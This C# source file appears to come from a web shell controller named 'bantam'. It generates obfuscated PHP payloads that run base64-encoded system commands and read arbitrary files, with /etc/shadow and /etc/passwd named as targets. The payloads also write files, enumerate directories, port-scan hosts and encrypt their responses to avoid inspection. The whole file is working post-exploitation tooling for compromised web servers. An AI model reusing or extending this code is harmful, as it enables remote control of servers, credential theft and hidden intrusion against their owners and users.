using System.Collections.Generic;

namespace bantam.Classes
{
    class PhpHelper
    {
        /// <summary>
        /// 
        /// </summary>
        public enum INIT_DATA_VARS
        {
            OS = 0,
            CWD,
            FREE_SPACE,
            TOTAL_SPACE,
            RELEASE,
            KERNEL,
            SERVER_IP,
            SERVER_SOFTWARE,
            USER,
            UID,
            GID,
            GROUP,
            PHP_VERSION
        }

        /// <summary>
        /// 
        /// </summary>
        public const  string rowSeperator = "|=$=|";

        /// <summary>
        /// 
        /// </summary>
        public const string g_delimiter = ",.$.,";

        /// <summary>
        /// PHP
        /// </summary>
        public const string phpServerScriptFileName = "$_SERVER['SCRIPT_FILENAME']";

        /// <summary>
        /// Linux File Locations
        /// </summary>
        public const string linuxFS_ShadowFile = "/etc/shadow";
        public const string linuxFS_PasswdFile = "/etc/passwd";
        public const string linuxFS_IssueFile = "/etc/issue.net";
        public const string linuxFS_hostTargetsFile = "/etc/hosts";
        public const string linuxFS_ProcVersion = "/proc/version";
        public const string linuxFS_NetworkInterfaces = "/etc/network/interfaces";

        /// <summary>
        /// Windows File Locations
        /// </summary>
        public const string windowsFS_hostTargets = "C:\\Windows\\System32\\drivers\\etc\\hosts";

        /// <summary>
        /// OS Commands
        /// </summary>
        public const string linuxOS_PsAux = "ps aux";
        public const string linuxOS_Ifconfig = "ifconfig";
        public const string windowsOS_Ipconfig = "ipconfig";
        public const string windowsOS_TaskList = "tasklist";
        public const string windowsOS_NetUser = "net user";
        public const string windowsOS_NetAccounts = "net accounts";
        public const string windowsOS_Ver = "ver";
        public const string posixOS_Whoami = "whoami";

        /// <summary>
        /// 
        /// </summary>
        /// <param name="maxNum"></param>
        /// <returns></returns>
        public static string RandomPHPVar(int maxNum = 16)
        {
            int length = Helper.RandomNumber(maxNum);
            return "$" + Helper.RandomString(1, true) + Helper.RandomString(maxNum - 1, true, true);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="maxNum"></param>
        /// <returns></returns>
        public static string RandomPHPComment(int maxNum = 32)
        {
            return "";   
            //check global cfg check "" if off, and have a slider for amount of comments, and a slider for length of comments
            int length = Helper.RandomNumber(maxNum);
            return "/*" + Helper.RandomString(length, true, true) + "*/";
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="varName"></param>
        /// <param name="encryptionKey"></param>
        /// <param name="encryptionIV"></param>
        /// <param name="mode"></param>
        /// <returns></returns>
        public static string OpenSSLEncryption(string varName, string encryptionKey, string encryptionIV, string mode = "AES-256-CBC")
        {
            return "echo base64_encode(@openssl_encrypt(" + varName + ", '" + mode + "', '" + encryptionKey + "', OPENSSL_RAW_DATA,'" + encryptionIV + "'));";
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="varName"></param>
        /// <param name="encryptionKey"></param>
        /// <param name="encryptionIV"></param>
        /// <returns></returns>
        public static string McryptEncryption(string varName, string encryptionKey, string encryptionIV)
        {
            string result = string.Empty;
            string padVar = RandomPHPVar();
            string blockBar = RandomPHPVar();

            result = blockBar + " = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);" + RandomPHPComment()
                   + padVar + " = " + blockBar + " - (strlen(" + varName + ") % " + blockBar + ");" + RandomPHPComment()
                   + varName + " .= str_repeat(chr(" + padVar + "), " + padVar + ");" + RandomPHPComment()
                   + "echo base64_encode(@mcrypt_encrypt(MCRYPT_RIJNDAEL_128, '" + encryptionKey + "', " + varName + ", MCRYPT_MODE_CBC, '" + encryptionIV + "'));";
            return result;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="responseEncryptionMode"></param>
        /// <param name="encryptionKey">Generated in this function and passed out by reference to use for decryption of the response</param>
        /// <param name="encryptionIV">Generated in this function and passed out by reference to use for decryption of the response</param>
        /// <returns></returns>
        public static string EncryptPhpVariableAndEcho(int responseEncryptionMode, ref string encryptionKey, ref string encryptionIV)
        {
            //todo make dynamic/random
            string varName = "$result";
            encryptionIV = EncryptionHelper.GetRandomEncryptionIV();
            encryptionKey = EncryptionHelper.GetRandomEncryptionKey();

            string encryption = RandomPHPComment()
                              + varName + " = base64_encode(" + varName + ");"
                              + RandomPHPComment();

            if (responseEncryptionMode == (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL) {
                encryption += OpenSSLEncryption(varName, encryptionKey, encryptionIV);
            } else if (responseEncryptionMode == (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.MCRYPT) {
                encryption += McryptEncryption(varName, encryptionKey, encryptionIV);
            } else {
                //todo global logging
            }

            encryption += RandomPHPComment();

            return encryption;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string InitShellData(bool encryptResponse)
        {
            string osVar = RandomPHPVar();
            string cwdVar = RandomPHPVar();
            string freespaceVar = RandomPHPVar();
            string totalfreespaceVar = RandomPHPVar();
            string releaseVar = RandomPHPVar();
            string kernelVar = RandomPHPVar();
            string serverIpVar = RandomPHPVar();
            string serverSoftwareVar = RandomPHPVar();
            string userVar = RandomPHPVar();
            string uidVar = RandomPHPVar();
            string gidVar = RandomPHPVar();
            string groupVar = RandomPHPVar();
            string phpVersionVar = RandomPHPVar();

            string responseCode = string.Empty;
            string linesRandomized = string.Empty;

            //order of these lines don't matter so we shuffle them around
            List<string> lines = new List<string> {
                osVar + " = 'nix'; if (strtolower(substr(PHP_OS, 0, 3)) == 'win'){ " + osVar + " = 'win';}",

                cwdVar + (" = dirname(__FILE__);" + freespaceVar + " = @diskfreespace(" + cwdVar + ");"
                       + totalfreespaceVar + " = @disk_total_space(" + cwdVar + ");" + totalfreespaceVar
                       + " = " + totalfreespaceVar + " ? " + totalfreespaceVar + " : 1;"),

                kernelVar       + " = @php_uname('s');",
                phpVersionVar   + " = phpversion();",
                releaseVar      + " = @php_uname('r');",
                serverIpVar     + " = $_SERVER['SERVER_ADDR'];",
                serverSoftwareVar + " = @getenv('SERVER_SOFTWARE');",
            };

            Helper.ShuffleList(lines);

            foreach (var line in lines) {
                linesRandomized += line;
                linesRandomized += RandomPHPComment();
            }

            if (encryptResponse) {
                responseCode = "$result = ";
            } else {
                responseCode = "echo ";
            }

            responseCode += osVar + ".'" + g_delimiter
                     + "'." + cwdVar + ".'" + g_delimiter
                     + "'." + freespaceVar + ".'" + g_delimiter
                     + "'." + totalfreespaceVar + ".'" + g_delimiter
                     + "'." + releaseVar + ".'" + g_delimiter
                     + "'." + kernelVar + ".'" + g_delimiter
                     + "'." + serverIpVar + ".'" + g_delimiter
                     + "'." + serverSoftwareVar + ".'" + g_delimiter
                     + "'." + userVar + ".'" + g_delimiter
                     + "'." + uidVar + ".'" + g_delimiter
                     + "'." + gidVar + ".'" + g_delimiter
                     + "'." + groupVar + ".'" + g_delimiter
                     + "'." + phpVersionVar + ";";

            return linesRandomized 
                + "if (!function_exists('posix_getegid')) {" + RandomPHPComment()
                + userVar + " = @get_current_user();" + RandomPHPComment()
                + uidVar + " = @getmyuid();" + RandomPHPComment()
                + gidVar + " = @getmygid();" + RandomPHPComment()
                + groupVar + " = '?';" + RandomPHPComment()
                + "} else {"
                + uidVar + " = @posix_getpwuid(posix_geteuid());" + RandomPHPComment()
                + gidVar + " = @posix_getgrgid(posix_getegid());" + RandomPHPComment()
                + userVar + "= " + uidVar + "['name'];" + RandomPHPComment()
                + uidVar + " = " + uidVar + "['uid'];" + RandomPHPComment()
                + gidVar + " = " + gidVar + "['gid'];" + RandomPHPComment()
                + groupVar + " = " + gidVar + "['name'];" + RandomPHPComment()
                + "}"
                + responseCode
                + RandomPHPComment();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public static string PortsScannerPorts1To1024()
        {
            return "$ports = range(1, 1024);";
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public static string PortScannerPortsAll()
        {
            return "$ports = range(1, 65535);";
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public static string PortScannerPortsCommon()
        {
            return "$ports = array(20, 21, 22, 23, 25, 53, 80, 81, 88, 110, 123, 135, 137, 138, 143, 443, 445, 587, 2049, 2082, 2083, 2086, 2087, 2525, 3306, 6379, 6380, 8443, 8843, 8080, 8081, 8888, 11211);";
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="host"></param>
        /// <returns></returns>
        public static string PortScanner(string host, string portsCode, bool encryptResponse)
        {
            if (encryptResponse) {
                return RandomPHPComment()
                     + "$result='';"
                     + "@ini_set('max_execution_time', 0);"
                     + portsCode
                     + "foreach ($ports as $port) {"
                        + "$conn = @fsockopen('" + host + "', $port, $errno, $err, 2);"
                         + "if (is_resource($conn)) { "
                             + "$result .= $port . ' ' . getservbyport($port, 'tcp'). '" + rowSeperator + "';"
                             + "fclose($conn);"
                        + "}}"
                     + "if (empty($result)) { $result = 'None'; }";
            } else {
                return RandomPHPComment()
                     + "@ini_set('max_execution_time', 0);"
                     + "$result = 0;"
                     + portsCode
                     + "foreach ($ports as $port) {"
                        + "$conn = @fsockopen('" + host + "', $port, $errno, $err, 2);"
                        + "if (is_resource($conn)) { "
                            + "$result = 1;"
                             + "echo $port . ' ' . getservbyport($port, 'tcp'). \"\n\";"
                             + "fclose($conn);"
                        + "}}"
                     + "if (empty($result)) { echo 'None'; }";
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="url"></param>
        /// <returns></returns>
        public static string getBasicCurl(string url, bool encryptResponse)
        {
            if (encryptResponse) {
                return "$curl = curl_init();" +
                        "curl_setopt_array($curl, array(" +
                            "CURLOPT_SSL_VERIFYPEER => false," +
                            "CURLOPT_FOLLOWLOCATION => true," +
                            "CURLOPT_USERAGENT => '" + WebHelper.g_GlobalDefaultUserAgent  + "'," +
                            "CURLOPT_RETURNTRANSFER => 1," +
                            "CURLOPT_URL => '" + url + "'," +
                        "));" +
                        "$result = curl_exec($curl);" +
                        "curl_close($curl);";
            } else {
                return "$curl = curl_init();" +
                        "curl_setopt_array($curl, array(" +
                            "CURLOPT_SSL_VERIFYPEER => false," +
                            "CURLOPT_FOLLOWLOCATION => true," +
                            "CURLOPT_USERAGENT => '" + WebHelper.g_GlobalDefaultUserAgent + "'," +
                            "CURLOPT_URL => '" + url + "'," +
                        "));" +
                        "curl_exec($curl);" +
                        "curl_close($curl);";
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="code"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string PhpInfo(bool encryptResponse)
        {
            if (encryptResponse) {
                return RandomPHPComment()
                      + "@ob_start();"+ RandomPHPComment()
                      + "phpinfo();"+ RandomPHPComment()
                      + "$result = @ob_get_contents();" + RandomPHPComment()
                      + "@ob_end_clean();"  + RandomPHPComment();
            } else {
                return RandomPHPComment()
                       + "phpinfo();"
                       + RandomPHPComment();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="encryptReponse"></param>
        /// <returns></returns>
        public static string PhpTestExecutionWithEcho1(bool encryptReponse)
        {
            string phpTestExecutionWithEcho = string.Empty;
            if (encryptReponse) {
                phpTestExecutionWithEcho = RandomPHPComment()
                                         + "$result = '1';"
                                         + RandomPHPComment();

            } else {
                phpTestExecutionWithEcho = RandomPHPComment()
                                         + "echo '1';"
                                         + RandomPHPComment();
            }
            return phpTestExecutionWithEcho;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string GetHardDriveLettersPhp(bool encryptResponse)
        {
            string getHardDriveLetters = string.Empty;
            string driveVar = RandomPHPVar();

            if (encryptResponse) {
                getHardDriveLetters = RandomPHPComment()
                                    + "$result=''; foreach (range('a', 'z') as " + driveVar + ") {" + RandomPHPComment()
                                    + "if (is_dir(" + driveVar + @". ':\\')) { " + RandomPHPComment()
                                    + "$result .= " + driveVar + ".':|';" + RandomPHPComment()
                                    + "}}" + RandomPHPComment();
            } else {
                getHardDriveLetters = RandomPHPComment()
                                    + "foreach (range('a', 'z') as " + driveVar + ") {" + RandomPHPComment()
                                    + "if (is_dir(" + driveVar + @". ':\\')) {" + RandomPHPComment()
                                    + "echo " + driveVar + ".':|';" + RandomPHPComment()
                                    + "}}" + RandomPHPComment();
            }
            return getHardDriveLetters;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="fileName"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string ReadFileFromVar(string fileName, bool encryptResponse)
        {
            if (encryptResponse) {
                return RandomPHPComment()
                     + @"$result = @is_readable(" + fileName + ") ? file_get_contents(" + fileName + ") : 'File Not Readable';"
                     + RandomPHPComment();
            } else {
                return RandomPHPComment()
                     + "echo @is_readable(" + fileName + ") ? file_get_contents(" + fileName + ") : 'File Not Readable';"
                     + RandomPHPComment();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="fileName"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string ReadFile(string fileName, bool encryptResponse)
        {
            if (encryptResponse) {
                return RandomPHPComment()
                     + @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';"
                     + RandomPHPComment();
            } else {
                return RandomPHPComment()
                     + "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';"
                     + RandomPHPComment();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="remoteFileLocation"></param>
        /// <param name="b64FileContents"></param>
        /// <returns></returns>
        public static string WriteFile(string remoteFileLocation, string b64FileContents, string flags = "0")
        {
            return RandomPHPComment()
                 + "@file_put_contents('" + remoteFileLocation + "', base64_decode('" + b64FileContents + "'), " + flags + ");"
                 + RandomPHPComment();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="remoteFileLocation"></param>
        /// <param name="b64FileContents"></param>
        /// <returns></returns>
        public static string WriteFileVar(string fileLocationVar, string b64FileContents, string flags = "0")
        {
            return RandomPHPComment()
                 + "@file_put_contents(" + fileLocationVar  + ", base64_decode('" + b64FileContents + "'), " + flags + ");"
                 + RandomPHPComment();
        }

        /// <summary>
        /// Todo make a user controlled feature as to which function to use, but also use this and call it the something something method
        /// </summary>
        /// <param name="code"></param>
        /// <returns></returns>
        //    public static string executeSystemCode(string code)
        //    {
        //  return @"
        //        if (function_exists('exec')) {
        //            @exec($in, $out);
        //   echo @out;
        //        } elseif(function_exists('passthru')) {
        //            @passthru($in);
        //        } elseif(function_exists('system')) {
        //            @system($in);;
        //        } elseif(function_exists('shell_exec')) {
        //   echo @shell_exec($in);
        //        } elseif(is_resource($f = @popen($in, 'r'))) {
        //   $out = "";
        //            while (!@feof($f))
        //$out .= fread($f, 1024);
        //            pclose($f);
        //            echo $out;
        //        }";
        //    }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="code"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string ExecuteSystemCode(string code, bool encryptResponse)
        {
            code = Helper.EncodeBase64ToString(code);
            if (encryptResponse) {
                return RandomPHPComment()
                    + "@ob_start();" + RandomPHPComment()
                    + "@system(base64_decode('" + code + "'));" + RandomPHPComment()
                    + "$result = @ob_get_contents();" + RandomPHPComment()
                    + "@ob_end_clean();" + RandomPHPComment();
            } else {
                return RandomPHPComment() + "@system(base64_decode('" + code + "'));" + RandomPHPComment();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="location"></param>
        /// <param name="phpVersion"></param>
        /// <returns></returns>
        public static string DirectoryEnumerationCode(string location, string phpVersion, bool responseEncryption)
        {
            string varItem = RandomPHPVar();

            if (responseEncryption) {
                return RandomPHPComment()
                 + @"$result='';"
                 + @" try{ " + RandomPHPComment()
                 + @"foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {" + RandomPHPComment()
                 + @"$result .= " + varItem + "->getBasename().'" + g_delimiter + "'."
                        + varItem + "->getPath().'" + g_delimiter + "'."
                        + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + g_delimiter + "'."
                        + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + g_delimiter + "'."
                        + varItem + @"->getPerms().'" + rowSeperator + @"';" + RandomPHPComment() + @"
		            }}catch(Exception $e){ }" + RandomPHPComment();
            } else {
                return RandomPHPComment()
                 + @" try{ " + RandomPHPComment()
                 + @"foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {" + RandomPHPComment()
                 + @"echo " + varItem + "->getBasename().'" + g_delimiter + "'."
                        + varItem + "->getPath().'" + g_delimiter + "'."
                        + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + g_delimiter + "'."
                        + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + g_delimiter + "'."
                        + varItem + @"->getPerms().'" + rowSeperator + @"';" + RandomPHPComment() + @"
		            }}catch(Exception $e){ }" + RandomPHPComment();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="windowsOS"></param>
        /// <returns></returns>
        public static string TaskListFunction(bool windowsOS = true)
        {
            return (windowsOS) ? windowsOS_TaskList : linuxOS_PsAux;
        }
    }
}
